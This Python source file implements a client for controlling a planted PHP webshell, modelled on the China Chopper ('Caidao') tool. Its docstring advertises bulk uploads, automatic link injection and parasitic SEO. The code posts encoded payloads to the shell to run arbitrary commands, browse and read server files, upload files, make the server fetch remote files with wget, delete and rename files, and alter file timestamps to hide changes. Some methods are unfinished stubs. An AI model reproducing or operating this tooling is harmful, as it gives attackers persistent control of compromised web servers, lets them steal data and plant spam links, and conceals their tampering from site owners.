#!/usr/bin/env python
# -*- coding: UTF-8 -*-

# Authors: liangzhibang@baidu.com
# Date: 2018-05-25

__author__ = "liangzhibang@baidu.com"
__date__ = '2018/5/25'

import re
from collections import namedtuple
from typing import NoReturn
from urllib.parse import urlencode

import requests

from shells import PHP
import encode
import util

common_headers = {"Content-Type": "application/x-www-form-urlencoded"}


class Caidao(object):
    """
    本类是webshell操作的核心，这里负责一切webshell操作，例如批量上传等等，当然也负责自动挂链，寄生虫等高级功能
    功能如下：
    1 批量上传功能
    2 自动挂链功能
    3 执行命令
    4 定时监测webshell存活
    还有部分功能未完成
    """

    def __init__(self, url, password, types: str):
        self.url: str = url
        self.password: str = password
        self.types: object = PHP if types is "PHP" else None
        self.is_urlencode = self.types.is_urlencode
        self.pattern = re.compile("%s(.+)%s" % (self.types.LeftDelimiter, self.types.RightDelimiter), re.DOTALL)
        self.__initialize()

    def __initialize(self):
        self.__get_base_info()
        if self.is_linux:
            self.path: str = r"/bin/sh"
            self.separator = r"/"
        else:
            self.path: str = r"c:\\Windows\\System32\\cmd.exe"
            self.separator = "\\"

    def test_php_connection(self) -> bool:
        pass

    def test_asp_connection(self):
        pass

    def test_connection(self) -> object:
        if self.types == 'PHP':
            return self.test_php_connection()
        elif self.types == "ASP":
            return self.test_asp_connection()
        else:
            raise TypeError("could't found type, try again")

    @util.try_except(errors=AttributeError)
    def __submit_data(self, data: dict) -> str:
        data = util.dictToQuery(data) if not self.is_urlencode else urlencode(data)
        with requests.post(self.url, data=data,
                           headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}) as response:
            re_result = self.pattern.search(response.text)
        return re_result.group(1).strip()

    def find_writeable_folder(self):
        pass

    @util.try_except()
    def assemble_data(self, statement: str, func=lambda x: x, **kwargs) -> dict:
        data: str = func(getattr(self.types, statement))
        base: str = getattr(self.types, "BASE")
        encoding: func = getattr(encode, PHP.encoding)
        parameter: str = util.generate_random()
        result: dict = {
            self.password: base % ("$_POST[%s]" % parameter),
            parameter: encoding(data)
        }
        kwargs_copy = kwargs.copy()
        return {**result, **kwargs_copy}

    def exec_command(self, cmd: str) -> str:
        data: dict = self.assemble_data("SHELL", lambda x: x % [self.path, cmd])
        return self.__submit_data(data)

    @util.try_except()
    def __get_base_info(self) -> NoReturn:
        data: dict = self.assemble_data("BASE_INFO")
        result: str = self.__submit_data(data)
        tuple_result: list = result.split('\t')
        self.root_folder = tuple_result[0]
        self.info = tuple_result[2]
        self.is_linux: bool = True

    @util.try_except()
    def get_folder_list(self, folder: str) -> list:
        item: namedtuple = namedtuple('item', ("is_dir", 'name', "st_mtime", "size", 'permission'))
        data: str = self.__submit_data(self.assemble_data("SHOW_FOLDER", lambda x: x % folder))
        folder_list = []
        for i in data.split('\n'):
            folder_list.append(item._make(i.split('\t')))
        return folder_list

    @util.try_except(errors=TypeError)
    def read_file(self, item: namedtuple) -> str:
        if item.is_dir is 'T':
            raise TypeError
        data: dict = self.assemble_data("READ_FILE", lambda x: x % (item.name))
        return self.__submit_data(data)

    @util.try_except()
    def upload_file(self, remote_folder: str, local_file: str) -> bool:
        if self.separator not in remote_folder:
            folder: str = self.root_folder + self.separator + remote_folder
        with open(local_file, "rb") as f:
            content: str = util.gnucompress(f.read())
        result: str = self.__submit_data(self.assemble_data("UPLOAD_FILE", lambda x: x % folder, file=content))
        return True if result is "1" else False

    @util.try_except()
    def wget_file_from_web(self, url, remote_path) -> bool:
        # TODO url and remote_path must be verifed before download from url to remote_path
        result: str = self.__submit_data(self.assemble_data("WGET_FILE", lambda x: x % (url, remote_path)))
        return True if result is "1" else False

    @util.try_except()
    def download_file_from_shell(self, remote_file) -> bool:
        # TODO implement download file function.give a remote files and download to local.return true if successed,else return false
        pass

    @util.try_except()
    def rename(self, src: str, dst: str):
        # TODO src and dst must be verifed before used
        result: str = self.__submit_data(self.assemble_data("RENAME", lambda x: x % (src, dst)))
        return True if result is "1" else False

    @util.try_except()
    def delete_file(self, remote_path: str) -> bool:
        result: str = self.__submit_data(self.assemble_data("DELETE", lambda x: x % remote_path))
        return True if result is "1" else False

    @util.try_except()
    def new_folder(self, folder_name: str) -> bool:
        result: str = self.__submit_data(self.assemble_data("NEW_FOLDER", lambda x: x % folder_name))
        return True if result is "1" else False

    @util.try_except()
    def set_time(self, remote_file: str, time: str) -> bool:
        # TODO verifed
        result: str = self.__submit_data(self.assemble_data("SET_TIME", lambda x: x % (remote_file, time
                                                                                       )))
        return True if result is "1" else False


if __name__ == '__main__':
    a = Caidao("http://localhost:32769/1.php", "cmd", "PHP")
    print(a.new_folder("11111"))
